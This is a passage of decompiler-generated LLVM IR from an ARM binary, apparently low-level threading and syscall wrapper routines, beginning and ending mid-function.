  br label %dec_label_pc_e3bcthread-pre-split

dec_label_pc_e330:                                ; preds = %dec_label_pc_e3bcthread-pre-split, %dec_label_pc_e3b8
  %v0_e330 = phi i32 [ %v3_e3b8, %dec_label_pc_e3b8 ], [ %v0_e3bc.pr, %dec_label_pc_e3bcthread-pre-split ]
  %v1_e330 = inttoptr i32 %v0_e330 to i32*
  %v2_e330 = load i32, i32* %v1_e330, align 4
  store i32 %v2_e330, i32* %r3.global-to-local, align 4
  %v1_e334 = add i32 %v2_e330, 8
  %v2_e334 = inttoptr i32 %v1_e334 to i32*
  %v3_e334 = load i32, i32* %v2_e334, align 4
  store i32 %v3_e334, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_e338 = icmp eq i32 %v3_e334, 0
  br i1 %v2_e338, label %bb88, label %bb87

bb87:                                             ; preds = %dec_label_pc_e330
  br label %bb88

bb88:                                             ; preds = %dec_label_pc_e330, %bb87
  %v2_e340 = xor i1 %v2_e338, true
  call void @__pseudo_cond_branch(i1 %v2_e340, i32 %v3_e334)
  %v0_e344 = load i32, i32* @r6, align 4
  %v1_e344 = inttoptr i32 %v0_e344 to i32*
  %v2_e344 = load i32, i32* %v1_e344, align 4
  store i32 %v2_e344, i32* %r5.global-to-local, align 4
  %v1_e348 = add i32 %v2_e344, 20
  store i32 %v1_e348, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_e34c

dec_label_pc_e34c:                                ; preds = %dec_label_pc_e380.dec_label_pc_e34c_crit_edge, %bb88
  %v0_e350 = phi i32 [ %v0_e350.pre, %dec_label_pc_e380.dec_label_pc_e34c_crit_edge ], [ %v1_e348, %bb88 ]
  %v0_e34c = phi i32 [ %v0_e34c.pre, %dec_label_pc_e380.dec_label_pc_e34c_crit_edge ], [ %v2_e344, %bb88 ]
  %v1_e34c = add i32 %v0_e34c, 20
  %v2_e34c = inttoptr i32 %v1_e34c to i32*
  %v3_e34c = load i32, i32* %v2_e34c, align 4
  store i32 %v0_e350, i32* %r2.global-to-local, align 4
  store i32 %v3_e34c, i32* %r4.global-to-local, align 4
  %v1_e358 = add i32 %v3_e34c, -1
  store i32 %v1_e358, i32* @r1, align 4
  %v1_e35c102 = inttoptr i32 %v0_e350 to i32*
  %v2_e35c103 = load i32, i32* %v1_e35c102, align 4
  store i32 %v2_e35c103, i32* %r3.global-to-local, align 4
  %v3_e360105 = icmp uge i32 %v2_e35c103, %v3_e34c
  store i1 %v3_e360105, i1* %cpsr_c.global-to-local, align 1
  %v9_e360111 = icmp eq i32 %v2_e35c103, %v3_e34c
  br i1 %v9_e360111, label %dec_label_pc_e368, label %dec_label_pc_e380

dec_label_pc_e368:                                ; preds = %dec_label_pc_e34c, %dec_label_pc_e368.dec_label_pc_e35c_crit_edge
  %v0_e368112 = phi i32 [ %v1_e360.pre, %dec_label_pc_e368.dec_label_pc_e35c_crit_edge ], [ %v3_e34c, %dec_label_pc_e34c ]
  store i32 %v0_e368112, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_e378 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_e378, label %dec_label_pc_e37c, label %dec_label_pc_e368.dec_label_pc_e35c_crit_edge

dec_label_pc_e368.dec_label_pc_e35c_crit_edge:    ; preds = %dec_label_pc_e368
  %v0_e35c.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_e360.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_e35c = inttoptr i32 %v0_e35c.pre to i32*
  %v2_e35c = load i32, i32* %v1_e35c, align 4
  store i32 %v2_e35c, i32* %r3.global-to-local, align 4
  %v3_e360 = icmp uge i32 %v2_e35c, %v1_e360.pre
  store i1 %v3_e360, i1* %cpsr_c.global-to-local, align 1
  %v9_e360 = icmp eq i32 %v2_e35c, %v1_e360.pre
  br i1 %v9_e360, label %dec_label_pc_e368, label %dec_label_pc_e380

dec_label_pc_e37c:                                ; preds = %dec_label_pc_e368
  %v0_e37c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_e37c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_e380

dec_label_pc_e380:                                ; preds = %dec_label_pc_e34c, %dec_label_pc_e368.dec_label_pc_e35c_crit_edge, %dec_label_pc_e37c
  %v0_e38c = phi i32 [ %v0_e37c, %dec_label_pc_e37c ], [ %v2_e35c103, %dec_label_pc_e34c ], [ %v2_e35c, %dec_label_pc_e368.dec_label_pc_e35c_crit_edge ]
  %v1_e380 = phi i32 [ %v0_e37c, %dec_label_pc_e37c ], [ %v3_e34c, %dec_label_pc_e34c ], [ %v1_e360.pre, %dec_label_pc_e368.dec_label_pc_e35c_crit_edge ]
  %v3_e380 = icmp uge i32 %v0_e38c, %v1_e380
  store i1 %v3_e380, i1* %cpsr_c.global-to-local, align 1
  %v9_e380 = icmp eq i32 %v0_e38c, %v1_e380
  store i32 %v0_e38c, i32* %r2.global-to-local, align 4
  br i1 %v9_e380, label %dec_label_pc_e38c, label %dec_label_pc_e380.dec_label_pc_e34c_crit_edge

dec_label_pc_e380.dec_label_pc_e34c_crit_edge:    ; preds = %dec_label_pc_e380
  %v0_e34c.pre = load i32, i32* %r5.global-to-local, align 4
  %v0_e350.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_e34c

dec_label_pc_e38c:                                ; preds = %dec_label_pc_e380
  %v2_e38c = icmp ne i32 %v1_e380, 0
  store i1 %v2_e38c, i1* %cpsr_c.global-to-local, align 1
  %v7_e38c = icmp eq i32 %v1_e380, 1
  %v0_e394 = load i32, i32* @r6, align 4
  br i1 %v7_e38c, label %dec_label_pc_e394, label %dec_label_pc_e3b8

dec_label_pc_e394:                                ; preds = %dec_label_pc_e38c
  %v1_e394 = inttoptr i32 %v0_e394 to i32*
  %v2_e394 = load i32, i32* %v1_e394, align 4
  store i32 %v2_e394, i32* @r1, align 4
  %v1_e398 = add i32 %v2_e394, 24
  %v2_e398 = inttoptr i32 %v1_e398 to i32*
  %v3_e398 = load i32, i32* %v2_e398, align 4
  store i32 %v3_e398, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_e39c = icmp eq i32 %v3_e398, 0
  br i1 %v2_e39c, label %dec_label_pc_e3b8, label %dec_label_pc_e3a4

dec_label_pc_e3a4:                                ; preds = %dec_label_pc_e394
  %v1_e3a4 = add i32 %v2_e394, 20
  %v2_e3a4 = inttoptr i32 %v1_e3a4 to i32*
  %v3_e3a4 = load i32, i32* %v2_e3a4, align 4
  store i32 %v3_e3a4, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 129, i32* @r1, align 4
  store i32 240, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_e3b8

dec_label_pc_e3b8:                                ; preds = %dec_label_pc_e38c, %dec_label_pc_e3a4, %dec_label_pc_e394
  %v1_e3b8 = add i32 %v0_e394, 4
  %v2_e3b8 = inttoptr i32 %v1_e3b8 to i32*
  %v3_e3b8 = load i32, i32* %v2_e3b8, align 4
  store i32 %v3_e3b8, i32* @r6, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_e3bc = icmp eq i32 %v3_e3b8, 0
  br i1 %v2_e3bc, label %dec_label_pc_e3c4, label %dec_label_pc_e330

dec_label_pc_e3bcthread-pre-split:                ; preds = %dec_label_pc_e314, %dec_label_pc_e30c, %dec_label_pc_e2ac
  %v0_e3bc.pr = load i32, i32* @r6, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_e3bc12 = icmp eq i32 %v0_e3bc.pr, 0
  br i1 %v2_e3bc12, label %dec_label_pc_e3c4, label %dec_label_pc_e330

dec_label_pc_e3c4:                                ; preds = %dec_label_pc_e3b8, %dec_label_pc_e3bcthread-pre-split
  %v0_e3c4.pre = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_e3c4.pre, i32* %r0.global-to-local, align 4
  store i32 %v3_e034, i32* @r4, align 4
  store i32 %v9_e034, i32* @r6, align 4
  store i32 %v12_e034, i32* @r7, align 4
  store i32 %v15_e034, i32* @r8, align 4
  store i32 %v18_e034, i32* @sb, align 4
  store i32 %v21_e034, i32* @sl, align 4
  store i32 %v24_e034, i32* @fp, align 4
  store i32 %v31_e034, i32* @lr, align 4
  ret i32 %v0_e3c4.pre

dec_label_pc_e3fc:                                ; preds = %dec_label_pc_e17c
  %v1_e180 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v1_e180, i32* %r0.global-to-local, align 4
  store i32 %v3_e3fc, i32* %stack_var_-104, align 4
  store i32 %v1_e180, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_e404

dec_label_pc_e404:                                ; preds = %dec_label_pc_e484.dec_label_pc_e404_crit_edge, %dec_label_pc_e3fc
  %v0_e408 = phi i32 [ %v0_e408.pre, %dec_label_pc_e484.dec_label_pc_e404_crit_edge ], [ %v1_e180, %dec_label_pc_e3fc ]
  store i32 2, i32* %r1.global-to-local, align 4
  store i32 %v0_e408, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r4.global-to-local, align 4
  %v1_e410127 = inttoptr i32 %v0_e408 to i32*
  %v2_e410128 = load i32, i32* %v1_e410127, align 4
  store i32 %v2_e410128, i32* %r3.global-to-local, align 4
  %v3_e414130 = icmp ne i32 %v2_e410128, 0
  store i1 %v3_e414130, i1* %cpsr_c.global-to-local, align 1
  %v9_e414136 = icmp eq i32 %v2_e410128, 1
  br i1 %v9_e414136, label %dec_label_pc_e41c, label %dec_label_pc_e434

dec_label_pc_e41c:                                ; preds = %dec_label_pc_e404, %dec_label_pc_e41c.dec_label_pc_e410_crit_edge
  %v0_e41c137 = phi i32 [ %v1_e414.pre, %dec_label_pc_e41c.dec_label_pc_e410_crit_edge ], [ 1, %dec_label_pc_e404 ]
  store i32 %v0_e41c137, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_e42c = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_e42c, label %dec_label_pc_e430, label %dec_label_pc_e41c.dec_label_pc_e410_crit_edge

dec_label_pc_e41c.dec_label_pc_e410_crit_edge:    ; preds = %dec_label_pc_e41c
  %v0_e410.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_e414.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_e410 = inttoptr i32 %v0_e410.pre to i32*
  %v2_e410 = load i32, i32* %v1_e410, align 4
  store i32 %v2_e410, i32* %r3.global-to-local, align 4
  %v3_e414 = icmp uge i32 %v2_e410, %v1_e414.pre
  store i1 %v3_e414, i1* %cpsr_c.global-to-local, align 1
  %v9_e414 = icmp eq i32 %v2_e410, %v1_e414.pre
  br i1 %v9_e414, label %dec_label_pc_e41c, label %dec_label_pc_e434

dec_label_pc_e430:                                ; preds = %dec_label_pc_e41c
  %v0_e430 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_e430, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_e434

dec_label_pc_e434:                                ; preds = %dec_label_pc_e404, %dec_label_pc_e41c.dec_label_pc_e410_crit_edge, %dec_label_pc_e430
  %v0_e434 = phi i32 [ %v0_e430, %dec_label_pc_e430 ], [ %v2_e410128, %dec_label_pc_e404 ], [ %v2_e410, %dec_label_pc_e41c.dec_label_pc_e410_crit_edge ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_e434 = icmp eq i32 %v0_e434, 0
  %v0_e458.pre = load i32, i32* %r5.global-to-local, align 4
  br i1 %v2_e434, label %dec_label_pc_e454, label %dec_label_pc_e43c

dec_label_pc_e43c:                                ; preds = %dec_label_pc_e434
  store i32 %v0_e458.pre, i32* %r0.global-to-local, align 4
  %v0_e440 = load i32, i32* %r1.global-to-local, align 4
  %v1_e440 = add i32 %v0_e440, 126
  store i32 %v1_e440, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 240, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_e454

dec_label_pc_e454:                                ; preds = %dec_label_pc_e434, %dec_label_pc_e43c
  store i32 2, i32* @r1, align 4
  store i32 %v0_e458.pre, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v1_e460139 = inttoptr i32 %v0_e458.pre to i32*
  %v2_e460140 = load i32, i32* %v1_e460139, align 4
  store i32 %v2_e460140, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_e464147 = icmp eq i32 %v2_e460140, 0
  br i1 %v9_e464147, label %dec_label_pc_e46c, label %dec_label_pc_e484

dec_label_pc_e46c:                                ; preds = %dec_label_pc_e454, %dec_label_pc_e46c.dec_label_pc_e460_crit_edge
  %v0_e46c148 = phi i32 [ %v1_e464.pre, %dec_label_pc_e46c.dec_label_pc_e460_crit_edge ], [ 0, %dec_label_pc_e454 ]
  store i32 %v0_e46c148, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_e47c = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_e47c, label %dec_label_pc_e480, label %dec_label_pc_e46c.dec_label_pc_e460_crit_edge

dec_label_pc_e46c.dec_label_pc_e460_crit_edge:    ; preds = %dec_label_pc_e46c
  %v0_e460.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_e464.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_e460 = inttoptr i32 %v0_e460.pre to i32*
  %v2_e460 = load i32, i32* %v1_e460, align 4
  store i32 %v2_e460, i32* %r3.global-to-local, align 4
  %v3_e464 = icmp uge i32 %v2_e460, %v1_e464.pre
  store i1 %v3_e464, i1* %cpsr_c.global-to-local, align 1
  %v9_e464 = icmp eq i32 %v2_e460, %v1_e464.pre
  br i1 %v9_e464, label %dec_label_pc_e46c, label %dec_label_pc_e484

dec_label_pc_e480:                                ; preds = %dec_label_pc_e46c
  %v0_e480 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_e480, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_e484

dec_label_pc_e484:                                ; preds = %dec_label_pc_e454, %dec_label_pc_e46c.dec_label_pc_e460_crit_edge, %dec_label_pc_e480
  %v0_e484 = phi i32 [ %v0_e480, %dec_label_pc_e480 ], [ %v2_e460140, %dec_label_pc_e454 ], [ %v2_e460, %dec_label_pc_e46c.dec_label_pc_e460_crit_edge ]
  %v1_e484 = phi i32 [ %v0_e480, %dec_label_pc_e480 ], [ 0, %dec_label_pc_e454 ], [ %v1_e464.pre, %dec_label_pc_e46c.dec_label_pc_e460_crit_edge ]
  %v3_e484 = icmp uge i32 %v0_e484, %v1_e484
  store i1 %v3_e484, i1* %cpsr_c.global-to-local, align 1
  %v9_e484 = icmp eq i32 %v0_e484, %v1_e484
  br i1 %v9_e484, label %dec_label_pc_e48c, label %dec_label_pc_e484.dec_label_pc_e404_crit_edge

dec_label_pc_e484.dec_label_pc_e404_crit_edge:    ; preds = %dec_label_pc_e484
  %v0_e408.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_e404

dec_label_pc_e48c:                                ; preds = %dec_label_pc_e484
  %v2_e48c = load i32, i32* %stack_var_-104, align 4
  store i32 %v2_e48c, i32* @r4, align 4
  store i32 %v1_e180, i32* @r7, align 4
  store i32 57736, i32* @lr, align 4
  %v1_e490 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_e490

; uselistorder directives
  uselistorder i32 %v0_e480, { 1, 0, 2 }
  uselistorder i32 %v1_e464.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v1_e414.pre, { 2, 1, 0 }
  uselistorder i32 %v2_e410128, { 0, 2, 1, 3 }
  uselistorder i32 %v1_e180, { 2, 0, 1, 3 }
  uselistorder i32 %v0_e3bc.pr, { 1, 0 }
  uselistorder i32 %v3_e3b8, { 1, 2, 0 }
  uselistorder i32 %v1_e380, { 1, 0, 2, 3 }
  uselistorder i32 %v0_e37c, { 1, 0, 2 }
  uselistorder i32 %v1_e360.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_e300, { 1, 0, 2 }
  uselistorder i32 %v1_e2e4.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_e2d4, { 1, 0 }
  uselistorder i32 %v0_e178, { 1, 0, 2 }
  uselistorder i32 %v1_e15c.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v4_e134, { 2, 1, 0, 3 }
  uselistorder i32 %v0_e10c, { 1, 0, 2 }
  uselistorder i32 %v1_e0f0.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v2_e0b8, { 1, 0, 2 }
  uselistorder i32 %v0_e098, { 1, 0, 2 }
  uselistorder i32 %v1_e07c.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v3_e05c, { 0, 1, 2, 3, 5, 4, 6, 7 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %r7.global-to-local, { 0, 8, 1, 3, 4, 5, 6, 7, 9, 10, 11, 12, 13, 15, 14, 2 }
  uselistorder i32* %r5.global-to-local, { 1, 0, 2, 3, 4, 6, 5, 7, 8, 9, 10, 11, 12, 13, 14, 15 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2, 3, 4, 5, 7, 6, 8, 10, 9, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 22, 21, 23 }
  uselistorder i32* %r3.global-to-local, { 6, 8, 7, 43, 9, 10, 12, 11, 2, 13, 14, 15, 17, 16, 5, 18, 19, 20, 21, 23, 22, 3, 24, 25, 26, 27, 28, 29, 30, 32, 31, 4, 33, 34, 35, 37, 36, 1, 38, 39, 41, 40, 0, 42 }
  uselistorder i32* %r0.global-to-local, { 12, 0, 1, 2, 13, 3, 4, 5, 6, 7, 8, 9, 10, 11, 14, 17, 15, 16 }
  uselistorder i1* %cpsr_c.global-to-local, { 5, 6, 38, 39, 7, 9, 8, 1, 40, 17, 10, 11, 12, 15, 14, 4, 16, 18, 19, 21, 20, 2, 22, 23, 25, 24, 3, 26, 27, 29, 28, 0, 30, 31, 32, 33, 36, 37, 35, 34, 13 }
  uselistorder i32 126, { 1, 0 }
  uselistorder label %dec_label_pc_e484, { 2, 1, 0 }
  uselistorder label %dec_label_pc_e46c, { 1, 0 }
  uselistorder label %dec_label_pc_e454, { 1, 0 }
  uselistorder label %dec_label_pc_e434, { 2, 1, 0 }
  uselistorder label %dec_label_pc_e41c, { 1, 0 }
  uselistorder label %dec_label_pc_e3c4, { 1, 0 }
  uselistorder label %dec_label_pc_e3b8, { 1, 2, 0 }
  uselistorder label %dec_label_pc_e380, { 2, 1, 0 }
  uselistorder label %dec_label_pc_e368, { 1, 0 }
  uselistorder label %bb88, { 1, 0 }
  uselistorder label %dec_label_pc_e304, { 2, 1, 0 }
  uselistorder label %dec_label_pc_e2ec, { 1, 0 }
  uselistorder label %dec_label_pc_e17c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_e164, { 1, 0 }
  uselistorder label %dec_label_pc_e110, { 2, 1, 0 }
  uselistorder label %dec_label_pc_e0f8, { 1, 0 }
  uselistorder label %bb86, { 1, 0 }
  uselistorder label %dec_label_pc_e09c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_e084, { 1, 0 }
  uselistorder label %dec_label_pc_e120.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_e050, { 1, 0 }
}

define i32 @function_e494(i32 %arg1) local_unnamed_addr {
dec_label_pc_e494:
  %r0.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_e494 = load i32, i32* @r7, align 4
  store i32 %v3_e494, i32* %stack_var_-8, align 4
  %v0_e498 = call i32 @function_f150()
  store i32 %v0_e498, i32* %r0.global-to-local, align 4
  %v1_e49c = add i32 %v0_e498, -1060
  %v2_e49c = inttoptr i32 %v1_e49c to i32*
  %v3_e49c = load i32, i32* %v2_e49c, align 4
  %tmp7 = icmp slt i32 %v3_e49c, 1
  br i1 %tmp7, label %dec_label_pc_e4ac, label %dec_label_pc_e4d0

dec_label_pc_e4ac:                                ; preds = %dec_label_pc_e494
  %v2_e4a0 = icmp eq i32 %v3_e49c, 0
  br i1 %v2_e4a0, label %dec_label_pc_e4b0, label %dec_label_pc_e4bc

dec_label_pc_e4b0:                                ; preds = %dec_label_pc_e4ac
  %v1_e4b0 = add i32 %v0_e498, -1064
  %v2_e4b0 = inttoptr i32 %v1_e4b0 to i32*
  %v3_e4b0 = load i32, i32* %v2_e4b0, align 4
  store i32 %v3_e4b0, i32* %r0.global-to-local, align 4
  %v2_e4b4 = icmp eq i32 %v3_e4b0, 0
  br i1 %v2_e4b4, label %bb, label %bb8

dec_label_pc_e4bc:                                ; preds = %dec_label_pc_e4ac
  br label %bb8

bb:                                               ; preds = %dec_label_pc_e4b0
  store i32 0, i32* %v2_e4b0, align 4
  %v0_e4cc.pre = load i32, i32* %r0.global-to-local, align 4
  br label %bb8

bb8:                                              ; preds = %dec_label_pc_e4bc, %dec_label_pc_e4b0, %bb
  %v0_e4cc = phi i32 [ %v3_e4b0, %dec_label_pc_e4b0 ], [ %v0_e498, %dec_label_pc_e4bc ], [ %v0_e4cc.pre, %bb ]
  br label %dec_label_pc_e4d0

dec_label_pc_e4d0:                                ; preds = %dec_label_pc_e494, %bb8
  %v0_e4d0 = phi i32 [ %v3_e49c, %dec_label_pc_e494 ], [ %v0_e4cc, %bb8 ]
  store i32 %v0_e4d0, i32* %r0.global-to-local, align 4
  %v2_e4d4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_e4d4, i32* @r7, align 4
  ret i32 %v0_e4d0

; uselistorder directives
  uselistorder i32 %v0_e4d0, { 1, 0 }
  uselistorder i32 %v3_e49c, { 1, 2, 0 }
  uselistorder label %dec_label_pc_e4d0, { 1, 0 }
  uselistorder label %bb8, { 2, 0, 1 }
}

define i32 @function_e4dc(i32 %arg1) local_unnamed_addr {
dec_label_pc_e4dc:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_e4dc = load i32, i32* @r4, align 4
  store i32 %v3_e4dc, i32* %stack_var_-20, align 4
  %v0_e4e4 = call i32 @function_f150()
  store i32 %v0_e4e4, i32* %r0.global-to-local, align 4
  %v1_e4e8 = add i32 %v0_e4e4, -1064
  %v2_e4e8 = inttoptr i32 %v1_e4e8 to i32*
  %v3_e4e8 = load i32, i32* %v2_e4e8, align 4
  store i32 %v3_e4e8, i32* %r4.global-to-local, align 4
  %v2_e4ec = icmp eq i32 %v3_e4e8, 0
  store i32 %v0_e4e4, i32* @r3, align 4
  %v1_e4f4 = add i32 %v0_e4e4, -1060
  %v2_e4f4 = inttoptr i32 %v1_e4f4 to i32*
  %v3_e4f4 = load i32, i32* %v2_e4f4, align 4
  store i32 %v3_e4f4, i32* %r0.global-to-local, align 4
  br i1 %v2_e4ec, label %dec_label_pc_e4fc, label %dec_label_pc_e510

dec_label_pc_e4fc:                                ; preds = %dec_label_pc_e4dc
  store i32 %v3_e4f4, i32* %r4.global-to-local, align 4
  store i32 %v3_e4f4, i32* %v2_e4e8, align 4
  %v0_e538.pre = load i32, i32* %r0.global-to-local, align 4
  br label %bb28

dec_label_pc_e510:                                ; preds = %dec_label_pc_e4dc
  %v5_e514 = icmp sgt i32 %v3_e4f4, 0
  br i1 %v5_e514, label %bb28, label %dec_label_pc_e518

dec_label_pc_e518:                                ; preds = %dec_label_pc_e510
  %tmp = bitcast i32 %v3_e4f4 to float
  %tmp30 = call float @fabsf(float %tmp)
  %v1_e518 = bitcast float %tmp30 to i32
  store i32 %v1_e518, i32* @r3, align 4
  %v2_e51c = icmp eq i32 %v1_e518, 0
  br i1 %v2_e51c, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_e518
  store i32 %v3_e4e8, i32* %r0.global-to-local, align 4
  br label %bb28

.thread:                                          ; preds = %dec_label_pc_e518
  %v2_e524 = sub i32 0, %v3_e4f4
  store i32 %v2_e524, i32* %r0.global-to-local, align 4
  br label %bb28

bb28:                                             ; preds = %bb, %dec_label_pc_e510, %dec_label_pc_e4fc, %.thread
  %v0_e53c = phi i32 [ %v3_e4f4, %dec_label_pc_e510 ], [ %v0_e538.pre, %dec_label_pc_e4fc ], [ %v3_e4e8, %bb ], [ %v2_e524, %.thread ]
  store i32 %v0_e53c, i32* %r2.global-to-local, align 4
  %tmp31 = icmp ult i32 %v0_e53c, -4095
  br i1 %tmp31, label %dec_label_pc_e560, label %dec_label_pc_e548

dec_label_pc_e548:                                ; preds = %bb28
  %v0_e54c = call i32 @function_f150()
  %v3_e550 = load i16, i16* @global_var_1d2d8.209, align 2
  %v4_e550 = sext i16 %v3_e550 to i32
  store i32 %v4_e550, i32* @r3, align 4
  %v0_e554 = load i32, i32* %r2.global-to-local, align 4
  %v1_e554 = sub i32 0, %v0_e554
  store i32 %v1_e554, i32* %r2.global-to-local, align 4
  %v3_e558 = add i32 %v4_e550, %v0_e54c
  %v4_e558 = inttoptr i32 %v3_e558 to i32*
  store i32 %v1_e554, i32* %v4_e558, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_e560

dec_label_pc_e560:                                ; preds = %bb28, %dec_label_pc_e548
  %v0_e564 = phi i32 [ %v0_e53c, %bb28 ], [ -1, %dec_label_pc_e548 ]
  %v3_e560 = icmp eq i32 %v0_e564, -1
  store i32 %v0_e564, i32* %r5.global-to-local, align 4
  br i1 %v3_e560, label %dec_label_pc_e56c, label %dec_label_pc_e5b4

dec_label_pc_e56c:                                ; preds = %dec_label_pc_e560
  %v0_e570 = call i32 @function_f150()
  store i32 %v0_e570, i32* %r0.global-to-local, align 4
  %v3_e574 = load i16, i16* @global_var_1d2d8.209, align 2
  %v4_e574 = sext i16 %v3_e574 to i32
  %v2_e578 = add i32 %v4_e574, %v0_e570
  %v3_e578 = inttoptr i32 %v2_e578 to i32*
  %v4_e578 = load i32, i32* %v3_e578, align 4
  store i32 %v4_e578, i32* @r3, align 4
  %v7_e57c = icmp eq i32 %v4_e578, 38
  br i1 %v7_e57c, label %dec_label_pc_e588, label %dec_label_pc_e56c.dec_label_pc_e5b4_crit_edge

dec_label_pc_e56c.dec_label_pc_e5b4_crit_edge:    ; preds = %dec_label_pc_e56c
  %v0_e5b4.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_e5b4

dec_label_pc_e588:                                ; preds = %dec_label_pc_e56c
  %v0_e588 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_e588, i32* %r0.global-to-local, align 4
  %tmp32 = icmp ugt i32 %v0_e588, -4096
  br i1 %tmp32, label %bb29, label %.thread22

bb29:                                             ; preds = %dec_label_pc_e588
  %v5_e5a0 = sub i32 0, %v0_e588
  store i32 %v5_e5a0, i32* %r2.global-to-local, align 4
  %v7_e5a4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_ed2c.364 to i32), i32 ptrtoint (i32* @global_var_e5ac.365 to i32)) to i32*), align 4
  store i32 %v7_e5a4, i32* @r3, align 4
  %v4_e5a8 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v4_e5a8, i32* %r0.global-to-local, align 4
  %v7_e5ac = add i32 %v7_e5a4, %v0_e570
  %v8_e5ac = inttoptr i32 %v7_e5ac to i32*
  store i32 %v5_e5a0, i32* %v8_e5ac, align 4
  %v0_e5b0.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.thread22

.thread22:                                        ; preds = %dec_label_pc_e588, %bb29
  %v0_e5b0 = phi i32 [ %v0_e5b0.pre, %bb29 ], [ %v0_e588, %dec_label_pc_e588 ]
  store i32 %v0_e5b0, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_e5b4

dec_label_pc_e5b4:                                ; preds = %dec_label_pc_e56c.dec_label_pc_e5b4_crit_edge, %dec_label_pc_e560, %.thread22
  %v0_e5b4 = phi i32 [ %v0_e5b4.pre, %dec_label_pc_e56c.dec_label_pc_e5b4_crit_edge ], [ %v0_e564, %dec_label_pc_e560 ], [ %v0_e5b0, %.thread22 ]
  store i32 %v0_e5b4, i32* %r0.global-to-local, align 4
  %v2_e5b8 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_e5b8, i32* @r4, align 4
  ret i32 %v0_e5b4

; uselistorder directives
  uselistorder i32 %v0_e5b4, { 1, 0 }
  uselistorder i32 %v0_e588, { 1, 2, 0, 3 }
  uselistorder i32 %v0_e53c, { 2, 0, 1 }
  uselistorder i32 %v1_e518, { 1, 0 }
  uselistorder i32 %v3_e4f4, { 2, 1, 0, 5, 4, 3, 6 }
  uselistorder i32 %v0_e4e4, { 1, 0, 2, 3 }
  uselistorder i32* %r5.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 6, 5, 7, 8, 9, 10, 11, 0 }
  uselistorder i32 -1060, { 1, 0 }
  uselistorder i32 -1064, { 1, 0 }
  uselistorder label %dec_label_pc_e5b4, { 2, 0, 1 }
  uselistorder label %.thread22, { 1, 0 }
  uselistorder label %dec_label_pc_e560, { 1, 0 }
  uselistorder label %bb28, { 3, 0, 1, 2 }
}

define i32 @function_e5cc(i32 %arg1) local_unnamed_addr {
dec_label_pc_e5cc:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
